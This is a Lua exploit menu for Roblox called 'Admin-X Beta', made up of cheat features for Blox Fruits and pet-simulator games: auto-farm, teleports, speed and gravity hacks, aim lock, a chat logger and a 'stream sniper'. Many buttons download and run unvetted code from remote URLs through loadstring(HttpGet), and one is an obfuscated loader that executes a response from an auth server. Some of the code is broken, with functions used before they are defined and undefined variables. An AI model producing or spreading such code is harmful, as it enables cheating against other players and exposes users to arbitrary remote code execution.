
local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/RedzLibV5/main/Source.lua"))()




local Window = redzlib:MakeWindow({
  Title = "Admin-X Beta",
  SubTitle = "Dont expect it to be perfect ",
  SaveFolder = "Admin-x 1 Config"
})


local Tab = Window:MakeTab({"testing"})




local Button = Tab:AddButton({
  Name = "blox fruits bring all chest",
  Callback = function()
    local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

if character then
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local offset = Vector3.new(0, 0, 0) -- Adjust this to set the distance in front of the player

    -- First, anchor all BottomBuns to prevent movement
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "ChestModels" and v:IsA("BasePart") then
            v.Anchored = true
        end
    end

    -- Then, teleport all BottomBuns at once
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "ChestModels" and v:IsA("BasePart") then
            v.CFrame = rootPart.CFrame * CFrame.new(offset)
            offset = offset + Vector3.new(0, v.Size.Y, 0) -- Stack vertically
        end
    end

    -- Finally, re-enable physics for all BottomBuns
    for _, v in pairs(workspace:GetDescendants()) do
        if v.Name == "ChestModels" and v:IsA("BasePart") then
            v.Anchored = false
        end
    end
end

  end
})

Tab:AddButton({ 	Name  = "ai blox boat exeploit", 	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local boatsFolder = game.Workspace:WaitForChild("Boats")
local TweenService = game:GetService("TweenService")

for _, boat in pairs(boatsFolder:GetChildren()) do
    if boat:IsA("Model") then
        local primaryPart = boat.PrimaryPart or boat:FindFirstChildOfClass("BasePart")
        if primaryPart then
            -- Make sure the boat moves as a whole
            boat:SetPrimaryPartCFrame(CFrame.new(primaryPart.Position))
            
            local tweenInfo = TweenInfo.new(
                2, -- Time
                Enum.EasingStyle.Quad, -- EasingStyle
                Enum.EasingDirection.Out, -- EasingDirection
                0, -- RepeatCount (when less than zero the tween will loop indefinitely)
                false, -- Reverses (tween will not reverse once reaching its goal)
                0 -- DelayTime
            )

            local goal = {}
            goal.CFrame = character.HumanoidRootPart.CFrame

            local tween = TweenService:Create(boat.PrimaryPart, tweenInfo, goal)
            tween:Play()
        end
    end
end

end})


-- Get the Rooms folder
local RoomsFolder = game.Workspace:FindFirstChild("Rooms")
local items = {}

if RoomsFolder then
    for _, item in pairs(RoomsFolder:GetChildren()) do
        table.insert(items, item.Name)
    end
end

local selectedItem
local moveCurtains = false

Tab:AddDropdown({
    Name = "Dropdown",
    Default = items[1] or "",
    Options = items,
    Callback = function(Value)
        selectedItem = RoomsFolder:FindFirstChild(Value)
        print("Selected item:", Value)
    end    
})

Tab:AddToggle({
    Name = "Move Curtains",
    Default = false,
    Callback = function(Value)
        moveCurtains = Value
        if moveCurtains and selectedItem then
            local curtain = selectedItem:FindFirstChild("Curtain")
            if curtain then
                local clickDetector = curtain:FindFirstChild("ClickDetector")
                if clickDetector then
                    clickDetector:FireClickDetector()
                    print("Curtain's ClickDetector fired.")
                else
                    warn("ClickDetector not found!")
                end
            else
                warn("Curtain not found!")
            end
        elseif not moveCurtains then
            print("Move Curtains toggle is off!")
        end
    end    
})

print("Script ready. Select a room and toggle 'Move Curtains' to start.")



Tab:AddButton({ 	Name  = "ai blox fruits wired ass boat", 	Callback = function()

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

-- Get the Boats folder
local BoatsFolder = game.Workspace:FindFirstChild("Boats")

-- Get the owner's name (assuming the owner is the LocalPlayer)
local ownerName = Players.LocalPlayer.Name

-- Function to find the boat owned by the LocalPlayer
local function getBoatOwnedByPlayer()
    if BoatsFolder then
        for _, boat in pairs(BoatsFolder:GetChildren()) do
            if boat.Owner.Value == ownerName then
                return boat
            end
        end
    else
        warn("Boats folder not found!")
    end
    return nil
end

-- Function to move the boat using tween
local function moveBoatToLocation(boat, targetPosition, duration)
    if boat then
        local tweenInfo = TweenInfo.new(
            duration, -- Duration in seconds
            Enum.EasingStyle.Linear,
            Enum.EasingDirection.InOut
        )
        local tweenGoal = { Position = targetPosition }
        local boatTween = TweenService:Create(boat, tweenInfo, tweenGoal)
        boatTween:Play()
    else
        warn("Boat not found!")
    end
end

-- Function to make the boat look at a player
local function lookAtPlayer(boat, playerPosition)
    if boat then
        local direction = (playerPosition - boat.Position).unit
        local lookAtPosition = boat.Position + direction
        boat.CFrame = CFrame.lookAt(boat.Position, lookAtPosition)
    end
end

-- Function to move the boat around the server and look at players
local function moveBoatAroundServer(boat)
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character or player.CharacterAdded:Wait()
        if character and character:FindFirstChild("HumanoidRootPart") and player.Name ~= ownerName then
            -- Look at the player
            lookAtPlayer(boat, character.HumanoidRootPart.Position)
            wait(1) -- Adjust the wait time as needed

            -- Move towards the player
            local targetPosition = character.HumanoidRootPart.Position + Vector3.new(0, 0, 0)
            moveBoatToLocation(boat, targetPosition, 2) -- Adjust the duration as needed

            -- Move to a random position after reaching the player
            wait(2) -- Wait for the boat to reach the player
            local randomPosition = Vector3.new(
                math.random(-100, 100),
                math.random(5, 20),
                math.random(-100, 100)
            )
            moveBoatToLocation(boat, randomPosition, 3) -- Adjust the duration as needed

            -- Wait before moving to the next player
            wait(3)
        end
    end
end

-- Get the boat owned by the LocalPlayer
local myBoat = getBoatOwnedByPlayer()

-- Start the process of moving the boat around the server
if myBoat then
    moveBoatAroundServer(myBoat)
else
    warn("No boat found for the LocalPlayer!")
end

end})
Tab:AddButton({ 	Name  = "ai blox fruits auto farm", 	Callback = function()


local Players = game:GetService("Players")
local PathfindingService = game:GetService("PathfindingService")
local EnemiesFolder = game.Workspace:WaitForChild("Enemies")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Assume player has an attribute called "Level"
local playerLevel = player:WaitForChild("Level").Value

-- Define a table to hold quests
local Quests = {}
local currentQuestIndex = 1
local defeatedMobs = {}

-- Function to add a quest
local function addQuest(levelReq, name, tasks, reward)
    table.insert(Quests, {
        LevelReq = levelReq,
        Name = name,
        Task = tasks,
        Reward = reward
    })

    -- Initialize defeated mobs count for the new quest
    for mob, count in pairs(tasks) do
        defeatedMobs[mob] = 0
    end
end

-- Example quest added for testing --not tested so far
addQuest(0, "Trainee", {["Trainee"] = 5}, {Exp = 300, Beli = 350})
addQuest(0, "Bandit", {["Bandit"] = 5}, {Exp = 300, Beli = 350})
addQuest(10, "Monkeys", {["Monkeys"] = 6}, {Exp = 2300, Beli = 800})
addQuest(15, "Gorilla", {["Gorilla"] = 8}, {Exp = 4500, Beli = 1200})





-- Function to find the closest enemy within level and quest requirements
local function getClosestEnemy()
    local quest = Quests[currentQuestIndex]
    local closestEnemy = nil
    local shortestDistance = math.huge

    for _, enemy in pairs(EnemiesFolder:GetChildren()) do
        local enemyHumanoid = enemy:FindFirstChild("Humanoid")
        local enemyLevel = enemy:FindFirstChild("Level") and enemy.Level.Value
        local enemyType = enemy.Name

        if enemyHumanoid and enemyHumanoid.Health > 0 and enemyLevel then
            -- Only consider enemies within level range and quest requirements
            if math.abs(playerLevel - enemyLevel) <= 5 and quest.Task[enemyType] then
                local distance = (enemy.PrimaryPart.Position - character.PrimaryPart.Position).Magnitude
                if distance < shortestDistance then
                    closestEnemy = enemy
                    shortestDistance = distance
                end
            end
        end
    end

    return closestEnemy
end

-- Function to move to an enemy
local function moveToEnemy(enemy)
    local path = PathfindingService:CreatePath({
        AgentRadius = 2,
        AgentHeight = 5,
        AgentCanJump = true,
        AgentJumpHeight = humanoid.JumpHeight,
        AgentMaxSlope = humanoid.MaxSlope,
    })

    path:ComputeAsync(character.PrimaryPart.Position, enemy.PrimaryPart.Position)
    path:MoveTo(character.PrimaryPart)
end

-- Function to attack an enemy
local function attackEnemy(enemy)
    humanoid:MoveTo(enemy.PrimaryPart.Position)
    humanoid.MoveToFinished:Wait()

    -- Implement your melee attack logic here
    print("Attacking enemy:", enemy.Name)

    -- Update defeated mobs count
    if defeatedMobs[enemy.Name] then
        defeatedMobs[enemy.Name] = defeatedMobs[enemy.Name] + 1
    end
end

-- Function to check quest completion
local function checkQuestCompletion()
    local quest = Quests[currentQuestIndex]
    for mob, count in pairs(quest.Task) do
        if defeatedMobs[mob] < count then
            return false
        end
    end
    return true
end

-- Main loop
while true do
    local enemy = getClosestEnemy()
    if enemy then
        moveToEnemy(enemy)
        attackEnemy(enemy)

        -- Check quest completion
        if checkQuestCompletion() and currentQuestIndex < #Quests then
            currentQuestIndex = currentQuestIndex + 1
            print("Quest completed. Moving to the next quest: " .. Quests[currentQuestIndex].Name)

            -- Reset defeated mobs count for the new quest
            defeatedMobs = {}
            for mob, count in pairs(Quests[currentQuestIndex].Task) do
                defeatedMobs[mob] = 0
            end
        end
    end
    wait(1)
end

end })

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

-- Get the Boats folder
local BoatsFolder = game.Workspace:FindFirstChild("Boats")
local items = {}

if BoatsFolder then
    for _, item in pairs(BoatsFolder:GetChildren()) do
        table.insert(items, item.Name)
    end
end

local selectedItem
local moveBoats = false

Tab:AddDropdown({
    Name = "Dropdown",
    Default = items[1] or "",
    Options = items,
    Callback = function(Value)
        selectedItem = BoatsFolder:FindFirstChild(Value)
        print("Selected item:", Value)
    end    
})

Tab:AddToggle({
    Name = "Move Boats",
    Default = false,
    Callback = function(Value)
        moveBoats = Value
    end    
})

-- Function to move the boat using tween
local function moveBoatToLocation(boat, targetPosition, duration)
    if boat then
        local tweenInfo = TweenInfo.new(
            duration, -- Duration in seconds
            Enum.EasingStyle.Linear,
            Enum.EasingDirection.InOut
        )
        local tweenGoal = { Position = targetPosition }
        local boatTween = TweenService:Create(boat, tweenInfo, tweenGoal)
        boatTween:Play()
    else
        warn("Boat not found!")
    end
end

-- Function to make the boat look at a player
local function lookAtPlayer(boat, playerPosition)
    if boat then
        local direction = (playerPosition - boat.Position).unit
        local lookAtPosition = boat.Position + direction
        boat.CFrame = CFrame.lookAt(boat.Position, lookAtPosition)
    end
end

-- Function to move the boat around the server and look at players
local function moveBoatAroundServer(boat)
    for _, player in pairs(Players:GetPlayers()) do
        local character = player.Character or player.CharacterAdded:Wait()
        if character and character:FindFirstChild("HumanoidRootPart") and player.Name ~= Players.LocalPlayer.Name then
            -- Look at the player
            lookAtPlayer(boat, character.HumanoidRootPart.Position)
            wait(1) -- Adjust the wait time as needed

            -- Move towards the player
            local targetPosition = character.HumanoidRootPart.Position + Vector3.new(0, 10, 0)
            moveBoatToLocation(boat, targetPosition, 2) -- Adjust the duration as needed

            -- Wait before moving to the next player
            wait(3)
        end
    end
end

-- Function to check and move the boat if the toggle is active
local function checkAndMoveBoat()
    if moveBoats and selectedItem then
        moveBoatAroundServer(selectedItem)
    else
        if not selectedItem then
            warn("No boat selected!")
        end
        if not moveBoats then
            warn("Move Boats toggle is off!")
        end
    end
end

-- Start the process if conditions are met
checkAndMoveBoat()

local folder = game.Workspace:FindFirstChild("YourFolderName") -- Replace 'YourFolderName' with the name of your folder
local items = {}

if folder then
    for _, item in pairs(folder:GetChildren()) do
        table.insert(items, item.Name)
    end
end

local selectedItem

Tab:AddDropdown({
    Name = "Dropdown",
    Default = items[1] or "",
    Options = items,
    Callback = function(Value)
        selectedItem = folder:FindFirstChild(Value)
        print("Selected item:", Value)
    end    
})

Tab:AddToggle({
    Name = "Use Pathfinding",
    Default = false,
    Callback = function(Value)
        if Value and selectedItem then
            local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            local humanoidRootPart = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            
            if humanoid and humanoidRootPart then
                local pathfindingService = game:GetService("PathfindingService")
                local path = pathfindingService:CreatePath({
                    AgentRadius = 2,
                    AgentHeight = 5,
                    AgentCanJump = true,
                    AgentMaxSlope = 45,
                })
                
                path:ComputeAsync(humanoidRootPart.Position, selectedItem.Position)
                path:MoveTo(humanoidRootPart)
                
                path.Blocked:Connect(function()
                    humanoid:MoveTo(selectedItem.Position)
                end)
            end
        end
    end    
})


local Tab = Window:MakeTab({"Ai made"})

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local PathfindingService = game:GetService("PathfindingService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local targetPosition = Vector3.new(100, 0, 100) -- Set your target position here

local Toggle = Tab:AddToggle({
    Name = "Auto Walk",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Create a path to the target position
            local path = PathfindingService:CreatePath({
                AgentRadius = 2,
                AgentHeight = 5,
                AgentCanJump = true,
                AgentJumpHeight = 7,
                AgentMaxSlope = 45,
            })
            path:ComputeAsync(character.PrimaryPart.Position, targetPosition)
            local waypoints = path:GetWaypoints()

            -- Move along the path
            local function moveToNextWaypoint(index)
                if index > #waypoints then return end
                local waypoint = waypoints[index]
                humanoid:MoveTo(waypoint.Position)
                humanoid.MoveToFinished:Wait()
                moveToNextWaypoint(index + 1)
            end

            -- Start moving
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                moveToNextWaypoint(1)
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local dodgeDistance = 2 -- Distance to dodge side to side
local moveRight = true -- Toggle to switch direction

local Toggle = Tab:AddToggle({
    Name = "Auto Dodge",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                local dodgeDirection
                if moveRight then
                    dodgeDirection = Vector3.new(1, 0, 0) -- Move right
                else
                    dodgeDirection = Vector3.new(-1, 0, 0) -- Move left
                    
                    
                end
                
                moveRight = not moveRight -- Switch direction for next dodge
                local dodgePosition = character.PrimaryPart.Position + dodgeDirection * dodgeDistance
                character:SetPrimaryPartCFrame(CFrame.new(dodgePosition))
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local dodgeDistance = 2 -- Distance to dodge side to side
local moveRight = true -- Toggle to switch direction

local Toggle = Tab:AddToggle({
    Name = "Auto Dodge 2.0",
    Default = false,
    Callback = function(Value)
        if Value then
            -- Start the loop when the toggle is enabled
            Toggle.Loop = RunService.RenderStepped:Connect(function()
                local camera = workspace.CurrentCamera
                local dodgeDirection
                if moveRight then
                    dodgeDirection = Vector3.new(1, 0, 0) -- Move right
                else
                    dodgeDirection = Vector3.new(-1, 0, 0) -- Move left
                end
                moveRight = not moveRight -- Switch direction for next dodge
                local dodgePosition = character.PrimaryPart.Position + dodgeDirection * dodgeDistance
                character:SetPrimaryPartCFrame(CFrame.new(dodgePosition) * CFrame.Angles(0, math.rad(camera.CFrame:ToEulerAnglesYXZ()), 0))
            end)
        else
            -- Stop the loop when the toggle is disabled
            if Toggle.Loop then
                Toggle.Loop:Disconnect()
                Toggle.Loop = nil
            end
        end
    end
})


local Tab = Window:MakeTab({"Main"})




local Section = Tab:AddSection({
	Name = "Local Player"
})




local Section = Tab:AddSection({
	Name = "Set Speed"
})
local lastSpeed = 16 -- Default speed

local CoolSlider = Tab:AddSlider({
    Name = "Player Walk Speed",
    Min = 0,
    Max = 759,
    Default = 16,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "Speed",
    Callback = function(value)
        lastSpeed = value
        if Toggle.Enabled then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
        end
    end,
})

local Toggle = Tab:AddToggle({
    Name = "Set Speed",
    Default = false,
    Callback = function(Value)
        Toggle.Enabled = Value
        if Value then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = lastSpeed
        else
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16 -- Reset to default speed
        end
    end
})


local Section = Tab:AddSection({
	Name = "Set jump"
})


local lastJumpHeight = 7.2 -- Default jump height


-- Jump Height Slider
local JumpSlider = Tab:AddSlider({
    Name = "Player Jump Height",
    Min = 0,
    Max = 100,
    Default = 7.2,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "Jump",
    Callback = function(value)
        lastJumpHeight = value
        -- Apply jump height immediately if toggle is enabled
        if JumpToggle.Enabled then
            game.Players.LocalPlayer.Character.Humanoid.JumpHeight = value
        end
    end,
})

-- Jump Height Toggle
local JumpToggle = Tab:AddToggle({
    Name = "Set Jump Height",
    Default = false,
    Callback = function(Value)
        JumpToggle.Enabled = Value
        if Value then
            -- Apply the last chosen jump height when enabled
            game.Players.LocalPlayer.Character.Humanoid.JumpHeight = lastJumpHeight
        else
            -- Reset to default jump height when disabled
            game.Players.LocalPlayer.Character.Humanoid.JumpHeight = 7.2
        end
    end
})

local Section = Tab:AddSection({
	Name = "Set Gravity"
})

local lastGravity = 54 -- Default gravity

-- Gravity Slider
local GravitySlider = Tab:AddSlider({
    Name = "Player Gravity",
    Min = 0,
    Max = 100,
    Default = 54,
    Color = Color3.fromRGB(255, 255, 255),
    Increment = 1,
    ValueName = "Gravity",
    Callback = function(value)
        lastGravity = value
        -- Apply gravity immediately if toggle is enabled
        if GravityToggle.Enabled then
            game.Workspace.Gravity = value
        end
    end,
})

-- Gravity Toggle
local GravityToggle = Tab:AddToggle({
    Name = "Set Gravity",
    Default = false,
    Callback = function(Value)
        GravityToggle.Enabled = Value
        if Value then
            -- Apply the last chosen gravity when enabled
            game.Workspace.Gravity = lastGravity
        else
            -- Reset to default gravity when disabled
            game.Workspace.Gravity = 54
        end
    end
})

local Section = Tab:AddSection({
	Name = "Pet Simulator Games"
})

-- Variables to store toggle states
local autoCollectOrbs = false
local autoCollectLootbags = false

-- Create the toggle for Auto Collect Orbs
local ToggleOrbs = Tab:AddToggle({
    Name = "Auto Collect Orbs",
    Default = false,
    Callback = function(Value)
        autoCollectOrbs = Value
        if autoCollectOrbs then
            collectOrbs()
        end
    end
})

-- Function to auto collect orbs
local function collectOrbs()
    while autoCollectOrbs do
        local fororbs = workspace.__THINGS.Orbs:GetChildren()
        local MyOrbs = {}

        if #fororbs > 0 then
            for i, v in next, fororbs do
                MyOrbs[i] = tonumber(v.Name)
                v:Destroy()
            end
        end

        RE("Orbs: Collect"):FireServer(MyOrbs)
        wait(1) -- Adjust the wait time as needed
    end
end

-- Create the toggle for Auto Collect Lootbags
local ToggleLootbags = Tab:AddToggle({
    Name = "Auto Collect Lootbags",
    Default = false,
    Callback = function(Value)
        autoCollectLootbags = Value
        if autoCollectLootbags then
            collectLootbags()
        end
    end
})

-- Function to auto collect lootbags
local function collectLootbags()
    while autoCollectLootbags do
        local forlootbags = workspace.__THINGS.Lootbags:GetChildren()
        local MyLootbags = {}

        if #forlootbags > 0 then
            for i, v in next, forlootbags do
                MyLootbags[i] = tonumber(v.Name)
                v:Destroy()
            end
        end

        RE("Lootbags: Collect"):FireServer(MyLootbags)
        wait(1) -- Adjust the wait time as needed
    end
end

-- Run the orb and lootbag collection in separate threads
spawn(function()
    while true do
        if autoCollectOrbs then
            collectOrbs()
        end
        wait(1)
    end
end)

spawn(function()
    while true do
        if autoCollectLootbags then
            collectLootbags()
        end
        wait(1)
    end
end)


    local Toggle = Tab:AddToggle({
    Name = "Auto Collect Ranked Rewards",
    Default = false,
    Callback = function(Value)
  local ClaimRanks = Value
    for _,v in Player.PlayerGui.Rank.Frame.Rewards.Items.Unlocks:GetChildren() do
        if v.Name == "ClaimSlot" then
            RE("Ranks_ClaimReward"):FireServer(tonumber(v.Title.Text))
        end
    end
end})


local Section = Tab:AddSection({
	Name = "Afk Section"
})

local Toggle = Tab:AddToggle({
    Name = "Anti-Afk",
    Default = false,
    Callback = function(Value)
        if (value) then getconnections(game:GetService("Players").LocalPlayer.Idled) do
        v:Disable()
     end
 else
  print('Anti-Afk Script Not Active');
 end
end})

local Section = Tab:AddSection({
	Name = "Tools"
})

Tab:AddButton({ 	Name  = "Arceus x", 	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
end })

Tab:AddButton({ 	Name  = "aim lock", 	Callback = function()
loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
end })

Tab:AddButton({ 	Name  = "Teleoport tool", 	Callback = function()

  local plr = game:GetService("Players").LocalPlayer
        local mouse = plr:GetMouse()
        local tool = Instance.new("Tool")
        tool.RequiresHandle = false
        tool.Name = "[Teleport Tool]"
        tool.Activated:Connect(function()
        local root = plr.Character.HumanoidRootPart
        local pos = mouse.Hit.Position+Vector3.new(0,2.5,0)
        local offset = pos-root.Position
        root.CFrame = root.CFrame+offset
        end)
        tool.Parent = plr.Backpack


end })

Tab:AddButton({ 	Name  = "Remote spy", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/SimpleSpy/main/Mobile.lua"))()


end })


Tab:AddButton({ 	Name  = "Dex Explorer", 	Callback = function()

loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()


end })

local Button = Tab:AddButton({
  Name = "Dex explorer keyless",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/DEX-Explorer/main/Mobile.lua"))()
  end
})

Tab:AddButton({ 	Name  = "Inf Yeld", 	Callback = function()


loadstring(game:HttpGet(' https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

end })

Tab:AddButton({ 	Name  = "stream sniper", 	Callback = function()


loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Sniper.lua"))()


end })



Tab:AddButton({ 	Name  = "Player Hub", 	Callback = function()

loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubLoader.lua"))()

end })

Tab:AddButton({ 	Name  = "Name less Admin", 	Callback = function()

--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--getgenv().NamelessLoaded=false -- use this if nameless admin didn't load
loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))();

end })
Tab:AddButton({ 	Name  = "Eclipse hub", 	Callback = function()

getgenv().mainKey = "nil"
 
local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()

end })

Tab:AddButton({ 	Name = "vector position finder", 	Callback = function()
-- Made by TheXploiter

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local title = Instance.new("TextLabel")
local copy = Instance.new("TextButton")
local pos = Instance.new("TextBox")
local find = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.639646292, 0, 0.399008662, 0)
Frame.Size = UDim2.new(0, 387, 0, 206)
Frame.Active = true

title.Name = "title"
title.Parent = Frame
title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
title.BorderSizePixel = 0
title.Size = UDim2.new(0, 387, 0, 50)
title.Font = Enum.Font.GothamBold
title.Text = "Position Finder"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 30.000
title.TextWrapped = true

copy.Name = "copy"
copy.Parent = Frame
copy.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
copy.BorderSizePixel = 0
copy.Position = UDim2.new(0.527131796, 0, 0.635922313, 0)
copy.Size = UDim2.new(0, 148, 0, 50)
copy.Font = Enum.Font.GothamSemibold
copy.Text = "Copy"
copy.TextColor3 = Color3.fromRGB(255, 255, 255)
copy.TextSize = 20.000

pos.Name = "pos"
pos.Parent = Frame
pos.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
pos.BorderSizePixel = 0
pos.Position = UDim2.new(0.0904392749, 0, 0.305825233, 0)
pos.Size = UDim2.new(0, 317, 0, 50)
pos.Font = Enum.Font.GothamSemibold
pos.Text = ""
pos.TextColor3 = Color3.fromRGB(255, 255, 255)
pos.TextSize = 14.000
pos.TextWrapped = true

find.Name = "find"
find.Parent = Frame
find.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
find.BorderSizePixel = 0
find.Position = UDim2.new(0.0904392898, 0, 0.635922313, 0)
find.Size = UDim2.new(0, 148, 0, 50)
find.Font = Enum.Font.GothamSemibold
find.Text = "Find"
find.TextColor3 = Color3.fromRGB(255, 255, 255)
find.TextSize = 20.000

-- Scripts:

local function UMTQ_fake_script() -- copy.LocalScript
	local script = Instance.new('LocalScript', copy)

	script.Parent.MouseButton1Click:Connect(function()
		setclipboard(script.Parent.Parent.pos.Text)
	end)
end
coroutine.wrap(UMTQ_fake_script)()
local function KJAYG_fake_script() -- Frame.Dragify
	local script = Instance.new('LocalScript', Frame)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(KJAYG_fake_script)()
local function EKBNYI_fake_script() -- find.LocalScript
	local script = Instance.new('LocalScript', find)

	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.pos.Text = tostring(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
	end)
end
coroutine.wrap(EKBNYI_fake_script)()
end })


Tab:AddParagraph("Some script and gui are currently not working right now i am on a fix")


local Tab = Window:MakeTab({"Chat Logger"})



-- Store all chat messages
local chatLog = ""

-- Function to log chat messages
local function logChat(message)
    chatLog = chatLog .. "\n" .. message
    local Paragraph = Tab:AddParagraph({chatLog})
end

-- Connect the chat event to the log function
game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        logChat(player.Name .. ": " .. message)
    end)
end)

-- Log messages from players already in the game
for _, player in ipairs(game.Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        logChat(player.Name .. ": " .. message)
    end)
end




local Tab = Window:MakeTab({"Teleports"})
local Section = Tab:AddSection({"Teleport To Select Player"})
-- Local Script
local Players = game:GetService("Players")
local dropdown

-- Function to update the dropdown options
local function updateDropdown()
    local playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end

    if not dropdown then
        dropdown = Tab:AddDropdown({
            Name = "Players",
            Default = playerNames[1] or "",
            Options = playerNames,
            Callback = function(Value)
                local selectedPlayer = Players:FindFirstChild(Value)
                if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = selectedPlayer.Character.HumanoidRootPart.CFrame
                end
            end
        })
    else
        dropdown:SetOptions(playerNames)
    end
end

-- Connect the function to player added and removed events
Players.PlayerAdded:Connect(updateDropdown)
Players.PlayerRemoving:Connect(updateDropdown)

-- Initial update
updateDropdown()
local Section = Tab:AddSection({"Tween To Select Player"})
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local dropdown

-- Function to update the dropdown options
local function updateDropdown()
    local playerNames = {}
    for _, player in ipairs(Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end

    if not dropdown then
        dropdown = Tab:AddDropdown({
            Name = "Players",
            Default = playerNames[1] or "",
            Options = playerNames,
            Callback = function(Value)
                local selectedPlayer = Players:FindFirstChild(Value)
                if selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local targetCFrame = selectedPlayer.Character.HumanoidRootPart.CFrame
                    local humanoidRootPart = game.Players.LocalPlayer.Character.HumanoidRootPart
                    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
                    local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = targetCFrame})
                    tween:Play()
                end
            end
        })
    else
        dropdown:SetOptions(playerNames)
    end
end

-- Connect the function to player added and removed events
Players.PlayerAdded:Connect(updateDropdown)
Players.PlayerRemoving:Connect(updateDropdown)

-- Initial update
updateDropdown()





local Section = Tab:AddSection({"Soon"})




